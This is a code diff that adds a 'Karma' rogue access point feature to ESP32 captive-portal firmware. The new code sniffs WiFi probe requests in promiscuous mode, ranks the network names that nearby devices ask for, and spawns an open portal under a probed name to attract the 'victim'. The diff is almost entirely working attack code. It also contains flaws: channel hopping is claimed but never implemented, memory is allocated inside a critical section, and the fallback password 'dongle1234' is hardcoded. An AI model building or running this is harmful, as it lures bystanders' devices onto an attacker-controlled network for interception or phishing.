@@ -12,6 +12,7 @@
 #include "webserver.h"
 #include <WiFi.h>
 #include <WebServer.h>
+#include <esp_wifi.h>
 #include <DNSServer.h>
 #include <vector>
 
@@ -146,6 +147,78 @@ static void handleDisable() { s_stopRequested = true; }   // deferred: deleting
                                                          // the server from
                                                          // inside its own
                                                          // handler = UAF
+
+// ---- Karma implementation ----
+static portMUX_TYPE s_karmaMux = portMUX_INITIALIZER_UNLOCKED;
+// Probe requests (mgmt subtype 0x40) carry the requested SSID at offset 38.
+// We hop channels with promiscuous mode and tally every unique SSID.
+static bool s_karmaProbing = false;
+static std::vector<std::pair<String,uint32_t>> s_probes;
+
+static void IRAM_ATTR karmaSniffCb(void* buf, wifi_promiscuous_pkt_type_t type) {
+    if (type != WIFI_PKT_MGMT) return;
+    auto* pkt = (wifi_promiscuous_pkt_t*)buf;
+    uint32_t len = pkt->rx_ctrl.sig_len;
+    if (len < 40 || len > 512) return;
+    const uint8_t* p = pkt->payload;
+    if (p[0] != 0x40) return;                 // probe request
+    uint8_t ssidLen = p[37];
+    if (ssidLen == 0 || ssidLen > 32) return; // 0 = wildcard probe, skip
+    if (38 + ssidLen > (int)len) return;
+    String ssid((const char*)(p+38), ssidLen);
+    // tally in the sniff callback is unsafe for std::vector across tasks;
+    // probe requests arrive in WiFi task - use a simple critical section
+    portENTER_CRITICAL(&s_karmaMux);
+    for (auto& e : s_probes) {
+        if (e.first == ssid) { e.second++; portEXIT_CRITICAL(&s_karmaMux); return; }
+    }
+    if (s_probes.size() < 32) s_probes.push_back({ssid, 1});
+    portEXIT_CRITICAL(&s_karmaMux);
+}
+
+
+bool karmaProbing() { return s_karmaProbing; }
+
+void karmaStart() {
+    if (s_karmaProbing || web) return;     // portal busy
+    s_probes.clear();
+    WiFi.mode(WIFI_AP_STA);
+    WiFi.softAPdisconnect(true);           // quiet the management AP
+    delay(100);
+    esp_wifi_set_promiscuous(true);
+    const wifi_promiscuous_filter_t filt = {
+        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
+    esp_wifi_set_promiscuous_filter(&filt);
+    esp_wifi_set_promiscuous_rx_cb(&karmaSniffCb);
+    s_karmaProbing = true;
+    logLine("karma: probe sniffing started (channel hopping)");
+}
+
+void karmaStop() {
+    if (!s_karmaProbing) return;
+    esp_wifi_set_promiscuous(false);
+    s_karmaProbing = false;
+    // restore management AP
+    WiFi.mode(WIFI_AP);
+    WiFi.softAP(cfg.wifiSSID, strlen(cfg.wifiPass) >= 8 ? cfg.wifiPass : "dongle1234");
+    logLine("karma: probe sniffing stopped");
+}
+
+bool karmaSpawn(const String& ssid) {
+    if (!s_karmaProbing) return false;
+    esp_wifi_set_promiscuous(false);
+    s_karmaProbing = false;
+    // Bring the portal up under the probed name (channel the victim used
+    // doesn't matter - clients scan for the SSID)
+    return start(ssid, "");
+}
+
+std::vector<std::pair<String,uint32_t>> karmaProbeList() {
+    portENTER_CRITICAL(&s_karmaMux);
+    auto copy = s_probes;
+    portEXIT_CRITICAL(&s_karmaMux);
+    return copy;
+}
 
 bool start(const String& ssid, const String& htmlName) {
     if (running()) stop();
